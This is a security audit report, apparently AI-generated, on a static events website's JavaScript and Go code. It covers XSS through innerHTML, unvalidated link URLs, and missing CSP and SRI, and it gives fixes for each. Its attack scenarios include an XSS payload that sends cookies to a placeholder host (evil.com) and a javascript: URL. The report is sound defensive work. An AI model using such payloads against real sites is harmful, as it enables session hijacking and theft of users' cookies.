# Security Evaluation Report
**Project:** DFW Drag Events  
**Date:** November 13, 2025  
**Evaluator:** Cascade AI Security Analysis

## Executive Summary

**Overall Security Rating:** ⚠️ **MEDIUM RISK** (Requires Attention)

The project has **2 HIGH severity vulnerabilities** that should be addressed immediately, along with several medium and low priority improvements.

---

## 🔴 HIGH SEVERITY ISSUES

### 1. Cross-Site Scripting (XSS) Vulnerability - innerHTML with Unsanitized Data

**Location:** `site/assets/js/app.js`

**Affected Lines:**
- Line 121-128: Event list rendering
- Line 166-175: Event class rendering

**Issue:**
```javascript
card.innerHTML = `
  <div class="card-body">
    <h5 class="card-title">${ev.title}</h5>
    <h6 class="card-subtitle mb-2 text-body-secondary">${mapTrack.get(ev.track_id) || ev.track_name}</h6>
    <p class="card-text">${ev.description || ''}</p>
    ...
  </div>`;
```

**Vulnerability:**
User-controlled data from JSON files (`ev.title`, `ev.description`, `ev.track_name`, `cls.name`, `r.rule`) is directly interpolated into HTML without sanitization. If an attacker can modify the JSON files or database, they can inject malicious JavaScript.

**Attack Scenario:**
```json
{
  "title": "<img src=x onerror='alert(document.cookie)'>",
  "description": "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
}
```

**Severity:** HIGH - Can lead to session hijacking, credential theft, malware distribution

**Recommendation:**
```javascript
// Option 1: Use textContent (safest)
const titleEl = document.createElement('h5');
titleEl.className = 'card-title';
titleEl.textContent = ev.title; // Safe - no HTML parsing

// Option 2: Use DOMPurify library
import DOMPurify from 'dompurify';
card.innerHTML = DOMPurify.sanitize(`<div>...</div>`);

// Option 3: HTML escape function
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}
card.innerHTML = `<h5>${escapeHtml(ev.title)}</h5>`;
```

---

### 2. Unvalidated URL Assignment

**Location:** `site/assets/js/app.js:183`

**Issue:**
```javascript
if (ev.url) { link.href = ev.url; link.classList.remove('disabled'); }
```

**Vulnerability:**
The `ev.url` from JSON is directly assigned to `link.href` without validation. This allows `javascript:` URLs or other malicious schemes.

**Attack Scenario:**
```json
{
  "url": "javascript:alert('XSS')"
}
```

**Severity:** HIGH - Can execute arbitrary JavaScript

**Recommendation:**
```javascript
function isSafeUrl(url) {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

if (ev.url && isSafeUrl(ev.url)) {
  link.href = ev.url;
  link.classList.remove('disabled');
}
```

---

## 🟡 MEDIUM SEVERITY ISSUES

### 3. SQL Injection Risk in Go Backend

**Location:** `tools/internal/db/db.go`

**Status:** ✅ **CURRENTLY SAFE** (using parameterized queries)

**Observation:**
All database queries use parameterized statements:
```go
db.Query(`SELECT id, name FROM tracks WHERE id=?`, trackId)
```

**Recommendation:** Continue using parameterized queries. Never concatenate user input into SQL strings.

---

### 4. Missing Content Security Policy (CSP)

**Location:** All HTML files

**Issue:**
No CSP headers are set, allowing inline scripts and external resources from any domain.

**Recommendation:**
Add CSP meta tag to all HTML files:
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net;
  style-src 'self' https://cdn.jsdelivr.net 'unsafe-inline';
  img-src 'self' data:;
  connect-src 'self';
  font-src 'self' https://cdn.jsdelivr.net;
">
```

---

### 5. No Subresource Integrity (SRI) for CDN Resources

**Location:** All HTML files using Bootstrap CDN

**Issue:**
```html
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
```

**Vulnerability:**
If CDN is compromised, malicious code could be injected.

**Recommendation:**
Add SRI hashes:
```html
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" 
      rel="stylesheet" 
      integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH"
      crossorigin="anonymous">
```

---

## 🟢 LOW SEVERITY ISSUES

### 6. Missing HTTPS Enforcement

**Recommendation:**
Ensure CloudFront/S3 redirects HTTP to HTTPS and sets HSTS headers:
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

---

### 7. No Rate Limiting on Data Endpoints

**Issue:**
JSON files are publicly accessible without rate limiting.

**Impact:** LOW (static files, no sensitive data)

**Recommendation:**
Configure CloudFront rate limiting if needed.

---

### 8. Dependency Vulnerabilities

**Location:** `site/package.json`

**Issue:**
```
8 vulnerabilities (7 moderate, 1 critical)
```

**Recommendation:**
```bash
npm audit fix --force
```

**Note:** Already addressed in recent commits, but should be monitored regularly.

---

## ✅ SECURITY STRENGTHS

1. **✅ Parameterized SQL Queries** - All Go database code uses safe parameterized queries
2. **✅ No eval() Usage** - No dangerous `eval()` or `Function()` constructor calls
3. **✅ textContent for Most User Data** - Lines 147-150, 157 use safe `textContent`
4. **✅ Static Site Architecture** - Reduces attack surface (no server-side code execution)
5. **✅ No Authentication/Sessions** - No credential storage or session management to compromise
6. **✅ Read-Only Frontend** - No user input forms or data submission
7. **✅ Comprehensive Test Coverage** - 98.7% coverage helps catch bugs early

---

## PRIORITY ACTION ITEMS

### Immediate (This Week)
1. ✅ **Fix XSS in innerHTML** - Sanitize or use textContent
2. ✅ **Validate URLs** - Add URL scheme validation
3. ✅ **Add SRI hashes** - For Bootstrap CDN

### Short Term (This Month)
4. **Implement CSP** - Add Content Security Policy headers
5. **Update Dependencies** - Run `npm audit fix`
6. **Add HTTPS enforcement** - Configure HSTS headers

### Long Term (Ongoing)
7. **Regular Security Audits** - Monthly dependency scans
8. **Penetration Testing** - Annual third-party security review
9. **Security Training** - Keep team updated on OWASP Top 10

---

## RISK ASSESSMENT

| Vulnerability | Likelihood | Impact | Risk Level |
|--------------|------------|--------|------------|
| XSS via innerHTML | Medium | High | **HIGH** |
| Malicious URL | Low | High | **MEDIUM** |
| CDN Compromise | Low | Medium | **MEDIUM** |
| Missing CSP | Medium | Medium | **MEDIUM** |
| Dependency Vulns | Medium | Low | **LOW** |

---

## COMPLIANCE NOTES

- **OWASP Top 10 2021:**
  - A03:2021 – Injection ⚠️ (XSS vulnerability)
  - A05:2021 – Security Misconfiguration ⚠️ (Missing CSP)
  - A06:2021 – Vulnerable Components ⚠️ (npm vulnerabilities)

- **CWE Coverage:**
  - CWE-79: Cross-site Scripting (XSS) ⚠️
  - CWE-601: URL Redirection to Untrusted Site ⚠️
  - CWE-1021: Improper Restriction of Rendered UI Layers ⚠️

---

## CONCLUSION

The project is **functional and well-architected** but requires immediate attention to XSS vulnerabilities. The static site architecture provides inherent security benefits, but client-side rendering with `innerHTML` introduces risks.

**Recommended Timeline:**
- **Week 1:** Fix XSS and URL validation (2-4 hours)
- **Week 2:** Add CSP and SRI (1-2 hours)
- **Week 3:** Dependency updates and testing (1 hour)

**Estimated Effort:** 4-7 hours total to reach **LOW RISK** status.
